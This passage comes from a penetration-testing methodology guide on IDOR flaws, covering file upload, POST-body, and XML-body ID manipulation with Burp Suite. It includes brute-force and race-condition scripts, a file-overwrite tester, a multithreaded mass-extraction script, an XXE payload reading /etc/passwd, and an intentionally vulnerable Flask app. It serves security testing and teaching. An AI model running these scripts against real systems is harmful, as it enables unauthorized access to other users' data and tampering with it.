# Turbo Intruder race condition script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=100)
    
    # Queue multiple overwrite attempts
    for i in range(20):
        engine.queue(target.req, str(100))
    
    # Queue view attempts
    for i in range(20):
        engine.queue(target.req_view, str(100))
```

### **Step 15: Blind IDOR Testing**

**When no direct feedback:**
1. Upload file attempting to overwrite
2. Check if file content changed via UserA session
3. Monitor for time-based differences
4. Check email notifications
5. Monitor server logs (if accessible)

---

## 🎯 **SPECIFIC TEST CASES**

### **Case 1: Profile Picture Overwrite**

**Steps:**
```
UserA: Upload profile pic → /avatar/upload
Response: {"avatarId": 500}

UserB: Modify request
POST /avatar/update HTTP/1.1
Cookie: session=USERB

{"avatarId": 500, "image": [malicious content]}
```

### **Case 2: Document Version Control**

```
GET /documents/versions/100 HTTP/1.1
Cookie: session=USERA

Response: [{"version":1,"url":"/docs/100_v1"},{"version":2,"url":"/docs/100_v2"}]

UserB: POST /documents/100/version
{"version":2,"content":[malicious data]}
```

### **Case 3: Shared File Manipulation**

```
UserA: POST /files/share
{"fileId":100,"shareWith":"userB"}

UserB: POST /files/update
{"fileId":100,"content":[malicious data]}
```

### **Case 4: Thumbnail Generation**

```
POST /files/generate-thumbnail
Cookie: session=USERB

{"fileId":100,"size":"large"}
```

---

## 📝 **DOCUMENTATION TEMPLATE**

### **Finding Report Structure:**

```
Vulnerability: File Upload IDOR
Bug Number: 17
Severity: High
Endpoint: /api/files/upload

Steps to Reproduce:
1. Create UserA account
2. Upload file "test.txt" → fileId=100
3. Create UserB account
4. Capture upload request for UserB
5. Modify fileId parameter to 100
6. Upload malicious content
7. Access file as UserA to verify overwrite

Request:
[PASTE REQUEST]

Response:
[PASTE RESPONSE]

Impact:
- Can overwrite any user's files
- Potential for malware distribution
- Data loss for victims
- Possible privilege escalation if configuration files overwritten

Proof of Concept:
[Screenshots/video]

Remediation:
- Implement ownership checks
- Use UUID instead of sequential IDs
- Verify user permissions server-side
- Add CSRF tokens
- Implement file versioning
```

---

## 🔧 **AUTOMATION SCRIPTS**

### **Python Script for Burp Integration:**

```python
import requests
from bs4 import BeautifulSoup

class FileIDORTester:
    def __init__(self, target, session_a, session_b):
        self.target = target
        self.session_a = session_a
        self.session_b = session_b
        self.file_ids = []
        
    def enumerate_file_ids(self, user_session, start=1, end=100):
        """Enumerate accessible file IDs for a user"""
        for file_id in range(start, end):
            response = requests.get(
                f"{self.target}/files/{file_id}",
                cookies={"session": user_session}
            )
            if response.status_code == 200:
                self.file_ids.append(file_id)
                print(f"Found accessible file: {file_id}")
    
    def test_overwrite(self, victim_file_id):
        """Test if we can overwrite victim's file"""
        
        # First, verify victim owns the file
        victim_response = requests.get(
            f"{self.target}/files/{victim_file_id}",
            cookies={"session": self.session_a}
        )
        
        if victim_response.status_code != 200:
            return False
        
        # Attempt overwrite from attacker account
        files = {
            'file': ('malicious.txt', 'IDOR TEST', 'text/plain')
        }
        data = {
            'fileId': victim_file_id,
            'action': 'overwrite'
        }
        
        attack_response = requests.post(
            f"{self.target}/files/update",
            cookies={"session": self.session_b},
            data=data,
            files=files
        )
        
        # Verify if overwrite succeeded
        verify_response = requests.get(
            f"{self.target}/files/{victim_file_id}",
            cookies={"session": self.session_a}
        )
        
        return "IDOR TEST" in verify_response.text

# Usage
tester = FileIDORTester("https://target.com", "USERA_SESSION", "USERB_SESSION")
tester.enumerate_file_ids("USERA_SESSION", 1, 1000)

for file_id in tester.file_ids:
    if tester.test_overwrite(file_id):
        print(f"Vulnerable file ID: {file_id}")
```

---

## ⚠️ **WARNING SIGNS & INDICATORS**

### **Application is likely vulnerable if:**
- Sequential file IDs are used
- No ownership verification in file operations
- File paths include user IDs you can manipulate
- API returns file IDs in responses
- No CSRF protection on file operations
- File operations use GET requests
- File URLs are predictable

### **Successful exploitation indicators:**
- 200 OK when accessing others' files
- File content changes after overwrite
- Can delete others' files
- File metadata updates reflect
- Thumbnail regeneration shows new content

---

## 🛡️ **TESTING CHECKLIST**

```
[ ] Map all file upload endpoints
[ ] Create two test accounts
[ ] Identify file naming patterns
[ ] Test sequential IDs
[ ] Test UUID/GUID manipulation
[ ] Test different HTTP methods
[ ] Test parameter locations
[ ] Test file overwrite
[ ] Test file deletion
[ ] Test metadata updates
[ ] Test version control
[ ] Test shared files
[ ] Test race conditions
[ ] Test with Burp extensions
[ ] Document all findings
[ ] Create proof of concept
```

---

## 🎓 **PRACTICE LAB SETUP**

### **Build vulnerable app for testing:**

```python
# Vulnerable Flask app example
from flask import Flask, request, session
import os

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    file_id = request.form.get('fileId', str(random.randint(1, 1000)))
    file = request.files['file']
    
    # VULNERABLE: No ownership check
    file.save(f'/uploads/{file_id}_{file.filename}')
    return {'success': True, 'fileId': file_id}

@app.route('/files/<file_id>')
def get_file(file_id):
    # VULNERABLE: Anyone can access any file
    return send_from_directory('uploads', file_id)
```

---

## 📚 **ADDITIONAL RESOURCES**

- PortSwigger: File upload vulnerabilities
- OWASP: Testing for IDOR
- HackTricks: File Upload bypasses
- PayloadsAllTheThings: IDOR techniques

---

# 📍 **IDOR Technique #18: POST Body Parameter Manipulation - Complete Burp Suite Methodology**

## 🎯 **Technique Overview**
**Moving ID parameters from URL to POST body** - Testing for inconsistent authorization checks when parameters are moved to different locations.

---

## 🔍 **UNDERSTANDING THE VULNERABILITY**

### **Why This Works**
- Applications often validate authorization for obvious parameters (URL) but overlook hidden ones (POST body)
- Developers may trust POST body parameters more than URL parameters
- Different code paths might handle the same parameter differently

### **Common Scenarios**
```http
# Original Request (GET)
GET /api/user/profile?id=100 HTTP/1.1

# Vulnerable Pattern (POST)
POST /api/user/profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=101
```

---

## 📊 **PHASE 1: RECONNAISSANCE & MAPPING**

### **Step 1: Spider the Application**
1. **Configure Burp Spider**:
   ```
   Target → Site Map → Right-click → Spider this host
   ```

2. **Passive Crawling**:
   ```
   Proxy → Options → Passive Crawling → Enable
   ```

3. **Record All Endpoints with IDs**:
   - Create a spreadsheet/notepad
   - Document each endpoint with ID parameters
   - Note the HTTP method used

### **Step 2: Identify Potential Targets**
Look for these patterns:

```http
# Pattern 1: GET requests with IDs in URL
GET /api/orders/ORD-2024-001
GET /profile?user_id=123
GET /download?file_id=456

# Pattern 2: POST requests with IDs in URL
POST /api/user/100/update
POST /admin/delete/789

# Pattern 3: RESTful endpoints
GET /api/v1/users/100
DELETE /api/v1/posts/200
```

### **Step 3: Create Target List**
```
Target List Template:
├── GET /api/users/[ID]
├── GET /profile?user_id=[ID]
├── POST /api/orders/[ID]/cancel
├── DELETE /api/comments/[ID]
├── PUT /api/profile/[ID]/update
└── GET /download?file=[ID]
```

---

## 🛠️ **PHASE 2: BURP CONFIGURATION**

### **Step 1: Set Up Project Options**
```
Project Options → Connections → Platform Authentication
- Add any required authentication

Project Options → HTTP
- Enable "Redirections" → "Always"
- Set "Streaming responses" → On
```

### **Step 2: Configure Scope**
```
Target → Scope → Include in Scope
- Add all target domains
- Use "Advanced Scope Control" for precise targeting

Exclude from Scope:
- Logout endpoints
- Static resources (.js, .css, .png)
- Third-party domains
```

### **Step 3: Set Up Session Handling**
```
Project Options → Sessions
1. Add "Cookie Jar" → Use cookies from Proxy
2. Add "Session Handling Rules":
   - Check session validity
   - Auto-reauthentication
   - Macro for login if needed
```

---

## 🔬 **PHASE 3: BASIC TESTING METHODOLOGY**

### **Step 1: Baseline Request Capture**

1. **Intercept legitimate request**:
```http
GET /api/user/profile?id=100 HTTP/1.1
Host: target.com
Cookie: session=abc123
User-Agent: Mozilla/5.0
```

2. **Send to Repeater**: `Ctrl+R`

3. **Document baseline response**:
   - Status code: 200
   - Content length: 2450
   - Response time: 150ms
   - Contains: user data for ID 100

### **Step 2: Parameter Location Testing**

**Test Case A: Move GET parameter to POST body**

```http
# Original
GET /api/user/profile?id=100 HTTP/1.1

# Test 1 - POST with body
POST /api/user/profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

id=101

# Test 2 - POST with JSON body
POST /api/user/profile HTTP/1.1
Content-Type: application/json
Content-Length: 15

{"id":101}
```

**Test Case B: Move URL path parameter to body**

```http
# Original
GET /api/user/100/profile HTTP/1.1

# Test - Move to body
POST /api/user/profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=101
```

### **Step 3: Systematic Testing Matrix**

Create a testing matrix in Burp Intruder:

**Payload Positions:**
```
Original: /api/user/profile?id=§100§
Test 1: POST /api/user/profile | body: id=§101§
Test 2: POST /api/user/profile | body: {"id":§101§}
Test 3: PUT /api/user/profile | body: id=§101§
Test 4: PATCH /api/user/profile | body: id=§101§
```

---

## 🎯 **PHASE 4: ADVANCED BURP TECHNIQUES**

### **Technique 1: Burp Intruder Attack**

**Setup:**
```
Target: /api/user/profile
Positions: Add to body
Payload: Numbers 1-200 (or relevant ID range)

Attack Types:
1. Sniper - Single payload
2. Pitchfork - Multiple payload sets
3. Cluster bomb - Combinations
```

**Payload Processing Rules:**
```python
# Add payload processing
Payload Processing → Add:
1. Hash: SHA-256 (if IDs are hashed)
2. Base64-encode (if encoded)
3. Add prefix/suffix (if needed)
```

### **Technique 2: Burp Comparer Analysis**

**Process:**
1. Collect responses for different IDs
2. Send to Comparer
3. Look for:
   - Identical responses (possible authorization failure)
   - Slightly different responses (partial data leak)
   - Error messages (information disclosure)

### **Technique 3: Burp Sequencer**
For predictable ID patterns:

```
Sequencer → Live Capture
- Capture ID generation
- Analyze randomness
- Predict next valid IDs
```

---

## 🔄 **PHASE 5: VARIATION TESTING**

### **Test 1: Content-Type Variations**

```http
# URL-encoded
POST /api/user/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
id=101

# Multipart
POST /api/user/data HTTP/1.1
Content-Type: multipart/form-data; boundary=123
--123
Content-Disposition: form-data; name="id"
101
--123--

# JSON
POST /api/user/data HTTP/1.1
Content-Type: application/json
{"id":101}

# XML
POST /api/user/data HTTP/1.1
Content-Type: application/xml
<id>101</id>

# Plain text
POST /api/user/data HTTP/1.1
Content-Type: text/plain
101
```

### **Test 2: Parameter Name Variations**

```http
id=101
user_id=101
userId=101
UID=101
account=101
profile=101
document=101
file=101
order=101
```

### **Test 3: Nesting Variations**

```http
# Simple
{"id":101}

# Nested object
{"user":{"id":101}}

# Array
{"ids":[101]}

# Array of objects
{"users":[{"id":101}]}
```

---

## 🤖 **PHASE 6: AUTOMATED TESTING WITH BURP EXTENSIONS**

### **Recommended Extensions**

1. **Autorize** - Automate authorization tests
```
Extender → BApp Store → Install Autorize
Configuration:
- Low privilege session
- High privilege session
- Auto-run on all requests
```

2. **AuthMatrix** - Matrix-based testing
```
Configure roles and requests
Test all combinations automatically
Generate detailed reports
```

3. **JSON Web Tokens** - For JWT-based auth
```
Decode JWT tokens
Modify claims
Test signature validation
```

### **Custom Extension Script (Python)**

```python
from burp import IBurpExtender, IScannerCheck
from java.util import ArrayList
import re

class BurpExtender(IBurpExtender, IScannerCheck):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("IDOR POST Body Tester")
        callbacks.registerScannerCheck(self)
        
    def doPassiveScan(self, baseRequestResponse):
        # Analyze requests with IDs in URL
        analysis = self._helpers.analyzeRequest(baseRequestResponse)
        url = analysis.getUrl()
        
        # Check if URL contains ID pattern
        if re.search(r'/\d+', url.getPath()):
            return self.testIDOR(baseRequestResponse)
        return None
    
    def testIDOR(self, baseRequestResponse):
        # Create test cases
        testCases = []
        
        # Move ID from URL to POST body
        modified = self.moveToBody(baseRequestResponse)
        testCases.append(modified)
        
        return testCases if testCases else None
```

---

## 📝 **PHASE 7: MANUAL VALIDATION**

### **Validation Checklist**

For each potential finding:

- [ ] **Authentication**: Session is valid and belongs to attacker
- [ ] **Authorization**: Attacker shouldn't have access to target resource
- [ ] **Data Sensitivity**: What data was exposed?
- [ ] **Response Consistency**: Can you reproduce?
- [ ] **Different User**: Test with multiple victim accounts
- [ ] **Different Endpoints**: Test similar endpoints

### **Proof of Concept Documentation**

```markdown
# IDOR Vulnerability Report

## Vulnerability Type
IDOR via POST Body Parameter Manipulation

## Endpoint
POST /api/user/profile

## Original Request (Legitimate)
GET /api/user/profile?id=100

## Malicious Request
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=attacker_session

id=101

## Response
[Paste sensitive data here]

## Impact
Access to other users' profile data including:
- Full name
- Email address
- Payment methods
- Order history

## Steps to Reproduce
1. Log in as attacker user
2. Capture legitimate request to /api/user/profile?id=100
3. Change method to POST
4. Move ID parameter to body
5. Change ID value to 101
6. Observe unauthorized access
```

---

## 🎯 **PHASE 8: EXPLOITATION SCENARIOS**

### **Scenario 1: Profile Data Access**

```http
# Step 1: Get your own profile
POST /api/profile HTTP/1.1
Cookie: session=abc123

{"action":"view", "user_id":100}

# Step 2: Try victim's ID
POST /api/profile HTTP/1.1
Cookie: session=abc123

{"action":"view", "user_id":101}

# Step 3: Check response for victim's data
HTTP/1.1 200 OK
{
  "user_id": 101,
  "email": "victim@email.com",
  "ssn": "123-45-6789",
  "payment_methods": [...]
}
```

### **Scenario 2: Function-Based Access**

```http
# Admin function with ID in URL
GET /admin/deleteUser?user_id=100

# Test as regular user
POST /admin/deleteUser HTTP/1.1
Cookie: session=user_session

user_id=101
```

### **Scenario 3: Mass Data Extraction**

```python
import requests
import threading

def extract_user_data(user_id):
    payload = {"user_id": user_id}
    response = requests.post(
        "https://target.com/api/profile",
        json=payload,
        cookies={"session": "attacker_session"}
    )
    if response.status_code == 200:
        save_data(user_id, response.json())

# Multi-threaded extraction
for user_id in range(1, 1000):
    thread = threading.Thread(target=extract_user_data, args=(user_id,))
    thread.start()
```

---

## 🛡️ **PHASE 9: REPORTING**

### **Report Template Sections**

1. **Executive Summary**
   - Brief description of vulnerability
   - Business impact
   - Risk rating

2. **Technical Details**
   - Vulnerable endpoints
   - Request/response examples
   - Authentication context

3. **Proof of Concept**
   - Step-by-step reproduction
   - Screenshots
   - Burp project file

4. **Impact Analysis**
   - Data exposed
   - Potential attack chains
   - Business risks

5. **Remediation Recommendations**
   - Immediate fixes
   - Long-term solutions
   - Code examples

### **Risk Rating Matrix**

| Factor | Rating | Score |
|--------|--------|-------|
| Exploitability | Easy | 3/3 |
| Prevalence | Common | 2/3 |
| Detectability | Medium | 2/3 |
| Technical Impact | High | 3/3 |
| Business Impact | High | 3/3 |
| **Overall** | **Critical** | **13/15** |

---

## 🔧 **PHASE 10: REMEDIATION TESTING**

### **Verify Fixes**

After fixes are implemented, retest:

```http
# Test 1: Original vulnerability
POST /api/profile HTTP/1.1
Cookie: session=attacker

id=101

# Should return 403 Forbidden

# Test 2: Parameter pollution
POST /api/profile?user_id=100 HTTP/1.1
Cookie: session=attacker

user_id=101

# Should validate both locations

# Test 3: Different formats
POST /api/profile HTTP/1.1
Content-Type: application/json
Cookie: session=attacker

{"user_id":101}

# Should properly authorize
```

---

## 📚 **ADDITIONAL RESOURCES**

### **Burp Suite Pro Tips**
- Use "Session Handling Rules" for complex authentication
- Create "Macros" for multi-step processes
- Utilize "Extensions" for automated testing
- Save "Configurations" for future tests

### **Common Pitfalls to Avoid**
- Don't test on production without permission
- Avoid rate limiting triggers
- Don't modify other users' data
- Document everything
- Stop if you find sensitive data

### **Practice Labs**
- PortSwigger Web Security Academy: IDOR labs
- PentesterLab: IDOR challenges
- HackTheBox: Machines with IDOR
- TryHackMe: IDOR rooms

---

## ✅ **FINAL CHECKLIST**

- [ ] Completed reconnaissance phase
- [ ] Configured Burp properly
- [ ] Tested all identified endpoints
- [ ] Tried all parameter locations
- [ ] Validated findings manually
- [ ] Documented PoC
- [ ] Assessed business impact
- [ ] Created comprehensive report
- [ ] Tested remediation
- [ ] Followed disclosure process

---

# 🎯 **Bug #19: XML Body IDOR - Complete Burp Suite Methodology**

## 📋 **Bug Description**
**IDOR in XML Body** - Manipulating object references within XML request bodies where the application fails to validate user authorization when processing XML data.

---

## 🔍 **PHASE 1: RECONNAISSANCE & DETECTION**

### **Step 1.1: Identify XML Endpoints**
First, find all endpoints that accept XML requests:

**Burp Filters:**
```
Proxy → HTTP History → Filter by MIME type: XML
Extension: .xml
Content-Type: application/xml
Content-Type: text/xml
```

**Search Patterns in Burp:**
```
Ctrl+F or "Search" tab → Search for:
- <?xml
- <xml
- application/xml
- text/xml
- Content-Type: application/xml
```

### **Step 1.2: Map XML Parameters**
Document all XML parameters that might contain IDs:

```xml
<!-- Common XML ID patterns to look for -->
<id>123</id>
<userId>456</userId>
<accountId>789</accountId>
<documentID>abc-123</documentID>
<reference>USER-001</reference>
<owner>current_user</owner>
<profileId>7890</profileId>
```

### **Step 1.3: Create Target List**
Create a spreadsheet/document with:
| Endpoint | Method | XML Structure | ID Parameters | Auth Required |
|----------|--------|---------------|---------------|---------------|
| /api/users | POST | `<user><id>123</id></user>` | id, userId | Yes |
| /updateProfile | PUT | `<profile><uid>456</uid></profile>` | uid | Yes |

---

## 🛠️ **PHASE 2: BURP SUITE CONFIGURATION**

### **Step 2.1: Burp Proxy Setup**
```
Proxy → Options → Intercept Client Requests:
- Add rule: "Content-Type contains xml"
- Enable interception for XML requests
```

### **Step 2.2: Configure Match and Replace**
```
Proxy → Options → Match and Replace:
Add Rule:
  Type: Request header
  Match: Content-Type: application/json
  Replace: Content-Type: application/xml
  (This helps convert JSON endpoints to XML)
```

### **Step 2.3: Setup Scope**
```
Target → Scope:
1. Add all relevant domains/IPs
2. Enable: "Use advanced scope control"
3. Check: "Include in scope based on the following:"
```

---

## 🔬 **PHASE 3: MANUAL TESTING WITH BURP REPEATER**

### **Step 3.1: Baseline Request**
Send a legitimate XML request to Repeater:

```xml
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/xml
Authorization: Bearer [your_token]

<request>
    <userId>100</userId>
    <action>view</action>
</request>
```

### **Step 3.2: Basic ID Manipulation**

**Technique 19.1: Sequential ID Testing**
```xml
<!-- Original -->
<userId>100</userId>

<!-- Test 1: Increment -->
<userId>101</userId>

<!-- Test 2: Decrement -->
<userId>99</userId>

<!-- Test 3: Zero -->
<userId>0</userId>

<!-- Test 4: Negative -->
<userId>-100</userId>
```

**Burp Repeater Setup:**
```
Right-click request → Send to Repeater
Create tabs for each test case
Use "Go" button to send each variation
Compare responses
```

### **Step 3.3: XML Structure Variations**

**Technique 19.2: Parameter Location Changes**
```xml
<!-- Move ID to different XML elements -->
<request>
    <user>
        <identifier>101</identifier>
    </user>
</request>

<!-- Try attributes instead of elements -->
<request>
    <user id="101"></user>
</request>

<!-- Nested structures -->
<request>
    <data>
        <profile>
            <userId>101</userId>
        </profile>
    </data>
</request>
```

### **Step 3.4: ID Format Variations**

**Technique 19.3: Format Manipulation**
```xml
<!-- Different numeric formats -->
<userId>100.0</userId>
<userId>0x64</userId>
<userId>0144</userId>
<userId>1.0E2</userId>

<!-- String formats -->
<userId>'100'</userId>
<userId>"100"</userId>
<userId> 100 </userId>
```

---

## 🤖 **PHASE 4: AUTOMATED TESTING WITH BURP INTRUDER**

### **Step 4.1: Configure Intruder Attack**

**Target Request:**
```xml
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/xml
Authorization: Bearer [your_token]

<request>
    <userId>§100§</userId>
</request>
```

### **Step 4.2: Payload Configuration**

**Payload Set 1: Sequential Numbers**
```
Payload type: Numbers
Range: 1-1000 (or 1-10000)
Step: 1
Number format: Decimal
```

**Payload Set 2: Common ID Wordlist**
```
admin
0
1
999
1000
1001
-1
999999
0001
001
```

**Payload Set 3: Fuzzing Payloads**
```
../../etc/passwd
${100}
{{100}}
<![CDATA[100]]>
<!--100-->
%31%30%30
```

### **Step 4.3: Attack Settings**

**Resource Pool:**
```
Intruder → Resource Pool:
- Maximum concurrent requests: 5-10 (be gentle)
- Delay between requests: 100-500ms
```

**Grep - Extract:**
```
Add items to extract from responses:
- Response code
- Content-Length
- Error messages
- User data patterns
```

**Grep - Match:**
```
Add strings to match:
- "unauthorized"
- "forbidden"
- "access denied"
- "not found"
- "success"
- username of other users
```

---

## 🎨 **PHASE 5: ADVANCED XML TECHNIQUES**

### **Step 5.1: XML External Entities (XXE) Combined**

**Test for XXE while testing IDOR:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request>
    <userId>&xxe;</userId>
    <action>view</action>
</request>
```

### **Step 5.2: XML Parameter Pollution**

**Multiple ID parameters:**
```xml
<request>
    <userId>100</userId>
    <userId>101</userId>
    <userId>102</userId>
</request>
```

**Nested conflicts:**
```xml
<request>
    <user>
        <id>100</id>
    </user>
    <userId>101</userId>
</request>
```

### **Step 5.3: XML Comments for ID Obfuscation**
```xml
<request>
    <userId><!-- Admin ID -->101</userId>
    <userId>100<!-- Actual user --></userId>
</request>
```

---

## 📊 **PHASE 6: RESPONSE ANALYSIS**

### **Step 6.1: Response Comparison Matrix**

Create comparison table in Burp:
```
Right-click response → "Show response in browser"
Or use "Comparer" tab:
1. Send baseline response to Comparer
2. Send test response to Comparer
3. Compare words/lines
```

**Track in spreadsheet:**
| Test ID | Parameter | Value | Status Code | Content-Length | Response Contains | Vulnerable? |
|---------|-----------|-------|-------------|----------------|-------------------|-------------|
| 001 | userId | 100 | 200 | 2543 | "John Doe" | Baseline |
| 002 | userId | 101 | 200 | 2678 | "Jane Smith" | YES |
| 003 | userId | 99 | 403 | 124 | "Forbidden" | NO |

### **Step 6.2: Response Analysis Filters**

**Burp Filters for Analysis:**
```
Proxy → HTTP History → Filter:
- Add filter: Status code: 200 (ignore 403/404)
- Add filter: Content length != baseline_length
- Search response for "email", "address", "ssn", etc.
```

---

## 🔄 **PHASE 7: CONTEXT-BASED TESTING**

### **Step 7.1: Different HTTP Methods**
Test same XML with different methods:

```bash
# Original POST
POST /api/user/profile

# Try GET with XML body
GET /api/user/profile
Content-Type: application/xml

<userId>101</userId>

# Try PUT
PUT /api/user/profile
# Same XML body

# Try PATCH
PATCH /api/user/profile
# Same XML body
```

### **Step 7.2: Different Endpoints**
Apply same XML ID manipulation across endpoints:

**Profile endpoint:**
```
POST /api/user/profile
XML: <userId>101</userId>
```

**Settings endpoint:**
```
POST /api/user/settings
XML: <userId>101</userId>
```

**Documents endpoint:**
```
POST /api/user/documents
XML: <owner>101</owner>
```

### **Step 7.3: Chained IDOR Testing**
```xml
<!-- Step 1: Get list of users -->
<request>
    <action>list</action>
</request>

<!-- Step 2: Use discovered IDs -->
<request>
    <userId>102</userId>
    <action>view_profile</action>
</request>

<!-- Step 3: Access related data -->
<request>
    <userId>102</userId>
    <action>view_documents</action>
</request>
```

---

## 🎭 **PHASE 8: AUTHENTICATION BYPASS TECHNIQUES**

### **Step 8.1: Token Manipulation**
```xml
<!-- Remove auth token -->
POST /api/user/profile
Content-Type: application/xml
<!-- No Authorization header -->

<userId>101</userId>
```

### **Step 8.2: Session Reuse**
```xml
<!-- Use your token, try other user's ID -->
Authorization: Bearer [YOUR_TOKEN]
<userId>[VICTIM_ID]</userId>
```

### **Step 8.3: Privilege Escalation**
```xml
<!-- Try admin functions with user token -->
<request>
    <userId>1</userId>  <!-- Admin ID -->
    <action>deleteUser</action>
    <targetId>102</targetId>
</request>
```

---

## 📈 **PHASE 9: BURP EXTENSIONS FOR IDOR**

### **Recommended Extensions:**

1. **Autorize** - Automated authorization testing
```
BApp Store → Install Autorize
Configure:
- Add your auth token
- Enable: "Auto detect unauthenticated"
- Run through your XML endpoints
```

2. **AuthMatrix** - Matrix-based authorization testing
```
Create matrix with:
- Users: [user1, user2, admin]
- Roles: [normal, power, admin]
- Endpoints: [XML endpoints]
- Test each combination
```

3. **JSON Web Tokens** - For JWT in XML
```
Decode/encode JWT tokens
Modify claims
Test with modified tokens in XML
```

4. **Turbo Intruder** - High-speed attacks
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for word in open('ids.txt'):
        engine.queue(target.req, word.rstrip())
```

---

## 📝 **PHASE 10: DOCUMENTATION & REPORTING**

### **Step 10.1: Burp Project Save**
```
Project → Save copy of project
Include:
- HTTP History with findings
- Intruder attacks
- Repeater tabs
- Scope configuration
```

### **Step 10.2: Evidence Collection**

**For each vulnerability found:**
1. **Request/Response pairs** (Burp → Save item)
2. **Screenshots** of successful access
3. **Video proof** if possible
4. **Impact demonstration**

### **Step 10.3: Report Template**

```markdown
# IDOR Vulnerability Report - XML Body Manipulation

## Vulnerability Title
IDOR in User Profile API (XML endpoint)

## Endpoint
POST /api/user/profile

## Description
The application fails to validate user authorization when processing XML requests, allowing authenticated users to access other users' profiles by modifying the userId parameter in the XML body.

## Steps to Reproduce
1. Login as user "attacker"
2. Capture the profile request:
   POST /api/user/profile
   Content-Type: application/xml
   
   <request>
       <userId>100</userId>
   </request>

3. Modify userId to 101:
   <request>
       <userId>101</userId>
   </request>

4. Observe response contains victim's personal data

## Proof of Concept
[Burp request/response screenshots]

## Impact
- Unauthorized access to personal information
- Data breach of PII
- Account takeover potential

## CVSS Score
7.5 (High) - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

## Remediation
- Implement server-side authorization checks
- Use session-based user identification
- Avoid client-supplied object references
```

---

## 🎯 **SPECIFIC XML IDOR TEST CASES**

### **Test Case Matrix for Bug #19**

| Test ID | Technique | XML Payload | Expected Result |
|---------|-----------|-------------|-----------------|
| 19-01 | Sequential ID | `<id>101</id>` | Access other user |
| 19-02 | Negative ID | `<id>-100</id>` | Possible bypass |
| 19-03 | Zero ID | `<id>0</id>` | Admin access? |
| 19-04 | Large number | `<id>999999</id>` | Error leak |
| 19-05 | String ID | `<id>admin</id>` | String-based ID |
| 19-06 | Encoded | `<id>%31%30%31</id>` | Encoding bypass |
| 19-07 | Multi-element | `<userid>101</userid>` | Parameter variation |
| 19-08 | Attribute | `<user id="101">` | Attribute injection |
| 19-09 | Nested | `<user><id>101</id></user>` | Deep reference |
| 19-10 | CDATA | `<id><![CDATA[101]]></id>` | CDATA bypass |

---

## ⚡ **AUTOMATION SCRIPTS FOR BURP**

### **Python Script for Burp Extender API**
```python
from burp import IBurpExtender, IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("XML IDOR Hunter")
        callbacks.registerHttpListener(self)
        print("XML IDOR Hunter loaded")
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
            
        request = messageInfo.getRequest()
        analyzedRequest = self._helpers.analyzeRequest(request)
        
        # Check if XML
        headers = analyzedRequest.getHeaders()
        content_type = [h for h in headers if "Content-Type" in h and "xml" in h.lower()]
        
        if content_type:
            body = request[analyzedRequest.getBodyOffset():].tostring()
            
            # Find IDs in XML
            ids = re.findall(r'<(\w+?)>(\d+)</\1>', body)
            if ids:
                print(f"Found IDs in XML: {ids}")
                # Add to Intruder
                self.addToIntruder(messageInfo, ids)
```

---

## 📚 **RESOURCES & CHEAT SHEETS**

### **Quick Reference: XML IDOR Payloads**
```
# Basic ID swaps
<id>101</id>
<userId>102</userId>
<account>103</account>

# Encoded payloads
<id>%31%30%31</id>
<id>&#49;&#48;&#49;</id>

# XML-specific
<id><![CDATA[101]]></id>
<id>101</id>  <!-- Hidden comment -->
<id>101</id>  <!-- Try XXE -->

# Arrays in XML
<ids>
    <id>100</id>
    <id>101</id>
</ids>

# Complex structures
<request>
    <user type="victim">
        <identifier>101</identifier>
    </user>
</request>
```

### **Success Indicators**
- ✅ Status 200 OK (not 403/401)
- ✅ Content length differs from baseline
- ✅ Response contains other users' data
- ✅ No authorization headers required
- ✅ Admin functions accessible
- ✅ Database errors showing data

### **False Positive Checks**
- ❌ Is it actually your data? (Check names/emails)
- ❌ Is it cached content? (Clear cache and retest)
- ❌ Is it public data? (Check if unauthenticated access works)
- ❌ Is it a test account? (Verify with production data)

---

## 🏆 **PRO TIPS**

1. **Use Burp Collaborator** for blind IDOR
2. **Check WebSockets** - Often have XML IDORs
3. **Test mobile API** - Different endpoints, same XML
4. **Version history** - Try older API versions
5. **Debug parameters** - Add `debug=true` to XML
6. **Admin functions** - Test for hidden admin IDs
7. **Race conditions** - Concurrent XML requests
8. **Cache poisoning** - Modify IDs in cached responses

---


# 🎯 **Bug #20: XML Body ID Manipulation - Complete Burp Suite Methodology**

## **Understanding Bug #20 - XML Body ID Parameter Manipulation**

This vulnerability occurs when an application uses XML data in requests and fails to properly validate authorization for object references within the XML structure.

---

## 📋 **PREREQUISITES & SETUP**

### **Burp Suite Configuration**
```
1. Proxy → Intercept → ON
2. Target → Scope → Add target domain
3. Proxy → Options → Enable Intercept Client Requests
4. Install Extensions (optional but recommended):
   - XML Formatter
   - Content Type Converter
   - XSS Validator
```

### **Browser Configuration**
```
1. Set proxy to 127.0.0.1:8080
2. Install Burp's CA certificate
3. Enable "Intercept requests" in Burp
```

---

## 🔍 **PHASE 1: RECONNAISSANCE & IDENTIFICATION**

### **Step 1.1: Identify XML-Based Endpoints**

**Manual Discovery:**
```
1. Monitor all POST/PUT requests with Content-Type: application/xml or text/xml
2. Look for:
   - SOAP APIs (/api/soap, /services, .asmx, .wcf)
   - REST APIs accepting XML
   - File uploads accepting XML
   - Configuration endpoints
```

**Burp Filter Setup:**
```
Proxy → HTTP History → Filter:
